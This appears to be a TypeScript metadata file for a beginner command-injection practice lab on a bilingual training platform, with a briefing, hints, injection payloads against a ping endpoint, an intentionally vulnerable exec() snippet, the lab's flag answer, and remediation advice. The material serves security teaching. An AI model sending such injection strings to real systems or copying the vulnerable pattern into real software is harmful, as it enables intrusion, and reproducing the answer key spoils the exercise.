// src/modules/practice-labs/command-injection/labs/lab1/lab1.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab1Metadata: LabMetadata = {
  slug: 'cmdi-basic-network-diagnostic-ping',
  title: 'Command Injection: Basic — Network Diagnostic Tool (Ping)',
  ar_title: 'حقن الأوامر: أساسي — أداة تشخيص الشبكة (Ping)',
  description:
    'Exploit a basic command injection vulnerability in a network diagnostic tool where user-supplied input is passed directly to a shell command without sanitization. Chain shell operators to execute arbitrary commands on the server.',
  ar_description:
    'استغل ثغرة حقن أوامر أساسية في أداة تشخيص شبكة حيث يتم تمرير المدخلات مباشرة إلى أمر shell بدون تعقيم. استخدم shell operators لتنفيذ أوامر عشوائية على الخادم.',
  difficulty: 'BEGINNER',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'Shell Operators',
    'OS Command Execution',
    'Input Validation Bypass',
  ],
  xpReward: 120,
  pointsReward: 60,
  duration: 25,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'The IT portal has a ping diagnostic tool. Inject shell operators into the host parameter to break out of the ping command and read the contents of /etc/flag.txt on the server.',
  ar_goal:
    'يملك بوابة IT أداة تشخيص ping. أدخل shell operators في معامل host للخروج من أمر ping وقراءة محتويات /etc/flag.txt على الخادم.',

  briefing: {
    en: `NetOps — IT network diagnostic portal. Used by sysadmins to check server connectivity.
There's a ping tool.
You type a hostname. It pings it. Returns output.
POST /network/ping { "host": "127.0.0.1" }
Response: "PING 127.0.0.1 ... 1 packet transmitted."
Now look at what the server is doing.
exec("ping -c 1 " + host)
Your input goes directly into a shell command.
No quotes. No escaping. No validation.
A shell executes: ping -c 1 127.0.0.1
What if your input was: 127.0.0.1; cat /etc/flag.txt
The shell executes: ping -c 1 127.0.0.1; cat /etc/flag.txt
Two commands.
Both run.
Both return output.
That's command injection.`,
    ar: `NetOps — بوابة تشخيص شبكة IT. يستخدمها مسؤولو النظام للتحقق من اتصال الخوادم.
توجد أداة ping.
تكتب hostname. تُنفَّذ. تُعاد النتيجة.
POST /network/ping { "host": "127.0.0.1" }
الاستجابة: "PING 127.0.0.1 ... 1 packet transmitted."
الآن انظر ما يفعله الخادم.
exec("ping -c 1 " + host)
مدخلاتك تذهب مباشرة إلى أمر shell.
بدون اقتباسات. بدون escape. بدون تحقق.
يُنفَّذ: ping -c 1 127.0.0.1
ماذا لو كان مدخلاتك: 127.0.0.1; cat /etc/flag.txt
يُنفَّذ: ping -c 1 127.0.0.1; cat /etc/flag.txt
أمران.
كلاهما يعمل.
كلاهما يُعيد الناتج.
هذا هو حقن الأوامر.`,
  },

  stepsOverview: {
    en: [
      'POST /network/ping { "host": "127.0.0.1" } — confirm normal functionality and observe output',
      'Understand the shell command: exec("ping -c 1 " + host) — direct concatenation, no escaping',
      'Test injection: { "host": "127.0.0.1; whoami" } — confirm command execution via response',
      'Enumerate: { "host": "127.0.0.1; ls /" } — list root filesystem',
      'Read flag: { "host": "127.0.0.1; cat /etc/flag.txt" } → FLAG returned in output',
    ],
    ar: [
      'POST /network/ping { "host": "127.0.0.1" } — أكّد الوظيفة العادية ولاحظ الناتج',
      'افهم أمر shell: exec("ping -c 1 " + host) — إلحاق مباشر بدون escape',
      'اختبر الحقن: { "host": "127.0.0.1; whoami" } — أكّد تنفيذ الأمر عبر الاستجابة',
      'استعرض: { "host": "127.0.0.1; ls /" } — اعرض نظام الملفات الجذر',
      'اقرأ العلم: { "host": "127.0.0.1; cat /etc/flag.txt" } → يُعاد العلم في الناتج',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'NetOps /network/ping executes exec("ping -c 1 " + userInput) with no sanitization. Any shell metacharacter (; && || |) appended to the host breaks out of the ping command and injects new OS commands. The backend runs as www-data with read access to /etc/flag.txt.',
    vulnerableCode:
      "// Network diagnostic endpoint (vulnerable):\napp.post('/network/ping', isAuthenticated, async (req, res) => {\n" +
      '  const { host } = req.body;\n' +
      '  // ❌ Direct string concatenation into shell command!\n' +
      '  const result = await exec(`ping -c 1 ${host}`);\n' +
      '  res.json({ output: result.stdout });\n' +
      '});',
    exploitation:
      'POST /network/ping { "host": "127.0.0.1; cat /etc/flag.txt" }\n' +
      'Shell executes: ping -c 1 127.0.0.1; cat /etc/flag.txt\n' +
      'Both commands run. Flag appears in stdout after ping output.',
    steps: {
      en: [
        'POST /network/ping { "host": "127.0.0.1; whoami" } → output includes "www-data" — RCE confirmed',
        'POST /network/ping { "host": "127.0.0.1; ls /" } → root filesystem listed',
        'POST /network/ping { "host": "127.0.0.1; cat /etc/flag.txt" } → output: FLAG{CMDI_BASIC_PING_SHELL_OPERATOR_INJECTION}',
      ],
      ar: [
        'POST /network/ping { "host": "127.0.0.1; whoami" } → الناتج يتضمن "www-data" — تأكيد RCE',
        'POST /network/ping { "host": "127.0.0.1; ls /" } → قائمة نظام الملفات الجذر',
        'POST /network/ping { "host": "127.0.0.1; cat /etc/flag.txt" } → الناتج: FLAG{CMDI_BASIC_PING_SHELL_OPERATOR_INJECTION}',
      ],
    },
    fix: [
      'Use execFile() or spawn() instead of exec(): these accept argument arrays — no shell interpretation, metacharacters are passed as literal strings',
      'Strict input validation: only allow valid IP/hostname characters [a-zA-Z0-9.-] via regex whitelist',
      'Parameterized command: execFile("/bin/ping", ["-c", "1", host]) — host is an argument, never interpreted by shell',
      'Principle of least privilege: run the service as a user with no access to sensitive files even if injection occurs',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Command injection occurs when user-controlled data is passed to a shell interpreter without proper escaping. The shell processes special characters (; && || | ` $()) as command separators and substitution operators — so any user input containing these characters can inject additional commands. The root cause is using exec() with string concatenation instead of parameterized execution functions like execFile() or spawn().',
      ar: 'يحدث حقن الأوامر عندما تُمرَّر بيانات يتحكم فيها المستخدم إلى مفسر shell بدون escape مناسب. يعالج الشيل الأحرف الخاصة (; && || | ` $()) كفواصل أوامر وعوامل استبدال — لذا يمكن لأي مدخل مستخدم يحتوي على هذه الأحرف حقن أوامر إضافية. السبب الجذري هو استخدام exec() مع إلحاق السلاسل بدلاً من وظائف التنفيذ المُعلَّمة مثل execFile() أو spawn().',
    },
    impact: {
      en: 'Full RCE (Remote Code Execution) on the server: arbitrary file reading, credential theft (/etc/shadow, .env files), lateral movement within the network, reverse shell establishment, container escape. This is the highest severity web vulnerability class — a single injection point can lead to complete infrastructure compromise.',
      ar: 'RCE كامل (تنفيذ كود عن بعد) على الخادم: قراءة ملفات عشوائية، سرقة بيانات الاعتماد (/etc/shadow، ملفات .env)، حركة جانبية داخل الشبكة، إنشاء reverse shell، هروب من الحاوية. هذه هي أعلى فئة ثغرات ويب خطورة — نقطة حقن واحدة يمكن أن تؤدي إلى اختراق كامل للبنية التحتية.',
    },
    fix: [
      'Never use exec() with string interpolation: the shell is not needed for most use cases',
      'execFile("/bin/ping", ["-c", "1", userInput]): arguments passed directly to the process — no shell involved',
      'Input allowlist: /^[a-zA-Z0-9\\.\\-]{1,253}$/ — only valid hostname characters',
      'Container isolation: run network tools in isolated containers with no access to sensitive filesystem paths',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        'Try the tool with a normal host like "127.0.0.1". Now what if you add a semicolon after it? What does ";" mean to a shell? It separates commands — both run sequentially.',
    },
    {
      order: 2,
      xpCost: 20,
      content:
        'Shell operators: ";" runs next command always. "&&" runs if first succeeds. "||" runs if first fails. "|" pipes output. Try: 127.0.0.1; whoami — does the response include a username?',
    },
    {
      order: 3,
      xpCost: 35,
      content:
        'POST /network/ping with { "host": "127.0.0.1; ls /" }. You should see the root directory listing in the response — that confirms full RCE.',
    },
    {
      order: 4,
      xpCost: 50,
      content:
        'POST /network/ping with { "host": "127.0.0.1; cat /etc/flag.txt" } to read the flag file directly.',
    },
  ],

  flagAnswer: 'FLAG{CMDI_BASIC_PING_SHELL_OPERATOR_INJECTION}',
  initialState: {
    contents: [
      {
        title: 'FLAG_FILE',
        body: JSON.stringify({
          path: '/etc/flag.txt',
          content: 'FLAG{CMDI_BASIC_PING_SHELL_OPERATOR_INJECTION}',
        }),
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'ETC_PASSWD',
        body: JSON.stringify({
          path: '/etc/passwd',
          content:
            'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnetops:x:1001:1001:NetOps Service:/home/netops:/bin/bash',
        }),
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'WHOAMI',
        body: JSON.stringify({ output: 'www-data' }),
        author: 'system_cmd',
        isPublic: false,
      },
      {
        title: 'LS_ROOT',
        body: JSON.stringify({
          output:
            'bin\nboot\netc\nhome\nlib\nopt\nproc\nroot\nrun\nsrv\ntmp\nusr\nvar',
        }),
        author: 'system_cmd',
        isPublic: false,
      },
    ],
  },
};
